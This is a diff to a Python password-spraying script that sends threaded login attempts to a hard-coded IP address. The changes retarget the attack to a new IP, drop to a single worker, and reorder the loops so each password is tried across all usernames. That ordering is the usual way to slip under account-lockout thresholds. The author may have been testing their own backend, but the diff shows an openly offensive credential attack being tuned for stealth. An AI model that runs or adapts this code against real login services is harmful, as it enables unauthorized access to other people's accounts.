@@ -6,6 +6,7 @@ import time
 # Set the correct target URL for the login endpoint on your backend
 url = "http://34.224.51.201:5050/login"
 # url = "https://reqbin.com/api/v1/ip"
+url = 'http://50.19.17.226:5050/login'
 
 # Define headers (optional)
 headers = {
@@ -55,11 +56,13 @@ def attempt_login(username, password):
 # Function to perform password spraying
 def password_spray(usernames, passwords):
     # Using ThreadPoolExecutor to manage a pool of threads
-    with ThreadPoolExecutor(max_workers=10) as executor:
+    with ThreadPoolExecutor(max_workers=1) as executor:
     # with ThreadPoolExecutor(max_workers=1) as executor:
         # Iterate through each username and try each password
-        for username in usernames:
-            for password in passwords:
+        # for username in usernames:
+        #     for password in passwords:
+        for password in passwords:
+            for username in usernames:
                 executor.submit(attempt_login, username, password)
 
 # Run the password spray
